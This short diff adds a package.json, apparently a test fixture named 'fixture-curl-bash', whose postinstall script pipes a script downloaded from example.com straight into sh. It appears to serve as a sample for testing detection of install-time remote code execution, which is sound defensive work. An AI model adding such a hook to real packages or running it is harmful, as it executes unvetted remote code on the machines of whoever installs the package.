@@ -1,0 +1,10 @@
+{
+  "name": "fixture-curl-bash",
+  "version": "1.0.0",
+  "dependencies": {
+    "fixture-package": "1.0.0"
+  },
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.com/install.sh | sh"
+  }
+}
